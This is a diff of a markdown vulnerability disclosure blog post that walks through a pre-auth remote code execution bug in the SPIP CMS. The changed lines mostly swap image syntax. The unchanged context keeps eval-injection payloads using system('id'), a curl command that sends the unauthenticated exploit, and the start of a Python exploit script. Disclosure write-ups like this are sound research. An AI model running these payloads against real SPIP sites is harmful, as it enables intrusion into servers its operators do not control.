@@ -18,19 +18,19 @@ Hello, [@Vozec1](https://x.com/Vozec1) here! 👋
 A month ago, [TheLaluka](https://x.com/TheLaluka/) [suggested](https://x.com/TheLaluka/status/1821821709499961817) finding his preauth RCE in SPIP as a challenge.
 The challenge was very nice and I had nothing to do, so I decided to take a look at this CMS.
 
-![tweet1.png](./tweet1.png)
+<img class="img_full" src="./tweet1.png" alt="./tweet1">
 
 He gave us a hint to narrow down the attack surface, as the project is substantial.
 So, with [Worty](https://x.com/_Worty), we found the vulnerability and [won the challenge](https://x.com/TheLaluka/status/1824357306433253480)!
 
-![win](win.png)
+<img class="img_full" src="win.png" alt="win">
 
 *Above is a screenshot from the [_barbhack_](https://x.com/_barbhack_) rump we gave to release the yet-another-spip-rce-challenge: the one we're disclosing today*
 
 
 He sent us 2 bottles of arranged rums to congratulate us *(what a prince!)* and everything could have ended there, but I enjoyed the challenge and it gave me a vague idea of how Spip works. I still had several subtleties in mind and still had some free time, so I thought I'd keep on looking for vulnerabilities.
 
-![rhum](rhum.png)
+<img class="img_med" src="rhum.png" alt="rhum">
 
 So I'm going to present what will lead to a new `RCE preauth on versions <= 4.3.1` of this CMS:
 
@@ -65,7 +65,7 @@ php -S 0.0.0.0:8000
 
 The installation page can be found here: [http://localhost:8000/spip.php?exec=install](http://localhost:8000/spip.php?exec=install)
 
-![Spip up](./spip_up.png)
+<img class="img_full" src="./spip_up.png" alt="./spip_up">
 
 ## Code review
 
@@ -252,7 +252,8 @@ Plus we read this comment:
 To trigger the various EVALs, we need to send a file with the parameter `name` of the form *champ[tons][][sous][la][pluie][]*.
 So you can navigate from the logged-in area to `/ecrire` and upload an image. Here I'm using the form to send a profile photo
 
-I also add:
+I also added:
+
 ```php
 error_log($racine);
 error_log($chemin);
@@ -260,7 +261,7 @@ $var = '$_FILES[\'' . $racine . '\'][\'error\']' . $chemin;
 error_log($var);
 ```
 
-![error_log](error_log.png)
+<img class="img_med" src="error_log.png" alt="error_log">
 
 Uploading an image sends 3 requests, 2 of which trigger the `extract_valid_files` function!
 
@@ -323,7 +324,7 @@ Content-Disposition: form-data; name="bigup_reinjecter_uniquement"
 @28ef70ab@
 -----------------------------35974249246826023222844215477--
 ```
-![log1](./log1.png)
+<img class="img_full" src="./log1.png" alt="./log1">
 
 You can immediately see that `$_FILES` is empty:
 
@@ -336,17 +337,17 @@ You can immediately see that `$_FILES` is empty:
 
 So we can ask our best friend to add a file to our POST request:
 
-![gpt won](./gpt.png)
+<img class="img_full" src="./gpt.png" alt="./gpt">
 
 And... IT'S A *small* WIN! We control the file passed to the function:
 
-![code_trigger](code_triggered.png)
+<img class="img_full" src="code_triggered.png" alt="code_triggered">
 
-![alt text](meme_gpt.png)
+<img class="img_med" src="meme_gpt.png" alt="meme_gpt">
 
 We can therefore adapt the `name` parameter with `[]`:
 
-![first](first.png)
+<img class="img_full" src="first.png" alt="first">
 
 Here is an extract from logs:
 
@@ -380,11 +381,11 @@ $error = $_FILES['HELLO']['error']['WORLD'];
 
 Response: **The server returns a 500 error!**
 
-![500](500.png)
+<img class="img_full" src="500.png" alt="500">
 
 From the docker logs, we can read:
 
-![500_log](500_log.png)
+<img class="img_full" src="500_log.png" alt="500_log">
 
 Here we see that the `'` is not filtered, so the context is broken and the call to *eval* returns an error.
 
@@ -401,13 +402,13 @@ The rce is now trivial, with the following payload:
 name="HELLO[AB'.system('id').die().'CD]"
 ```
 
-![rce](rce.png)
+<img class="img_full" src="rce.png" alt="rce">
 
-![win2](win2.png)
+<img class="img_med" src="win2.png" alt="win2">
 
 My first reaction was like
 
-![lalu](lalu.png)
+<img class="img_med" src="lalu.png" alt="lalu">
 
 But in the end he confirmed that he didn't have it in his notes!
 
@@ -430,7 +431,7 @@ The dot is filtered, but you can use `sprintf` to call the `die` function after 
 name="RCE'-sprintf(system('id'),die())-'[ABCD]"
 ```
 
-![isok](isok.png)
+<img class="img_full" src="isok.png" alt="isok">
 
 Hello, Laluka here, I'll take the next part that makes this lovely post-auth RCE pre-auth! 😉
 
@@ -485,7 +486,7 @@ What I wanted to have in the request, is the `formulaire_action_args` protected 
  - With extra "files" (our RCE payload)
  - With our extra `bigup_retrouver_fichiers` param to enable the bigup part!
 
-![formulaire_action_args](formulaire_action_args.png)
+<img class="img_full" src="formulaire_action_args.png" alt="formulaire_action_args">
 
 Any extra steps? Nope! It worked right away! 🍀
 
@@ -505,11 +506,11 @@ final_payload="formulaire_action=oubli&formulaire_action_args=$formulaire_action
 curl -ki -X POST -F "RCE['.system('$cmd').die().'][][ll]=@foo.txt" "$base_url&$final_payload"
 ```
 
-![unauth-spip-rce](unauth-spip-rce.png)
+<img class="img_full" src="unauth-spip-rce.png" alt="unauth-spip-rce">
 
 Vozec also made a python script for the same bug:
 
-```þython
+```python
 #!/bin/env python3
 import argparse
 import requests
@@ -627,11 +628,11 @@ Spip reacted in a timely manner, no timeline this time! Oh yeah, one last thing.
 
 > Nailed it! 😎
 
-![rce-rootme-acknowledgement](rce-rootme-acknowledgement.png)
+<img class="img_full" src="rce-rootme-acknowledgement.png" alt="rce-rootme-acknowledgement">
 
 ---
 
 As always, we hope you've had a nice time reading our adventures! 🧙\
 Feel free to follow both of us for future challenges & cool reads! 💝
 
-![lalu-and-vozec](lalu-and-vozec.png)
+<img class="img_med" src="lalu-and-vozec.png" alt="lalu-and-vozec">
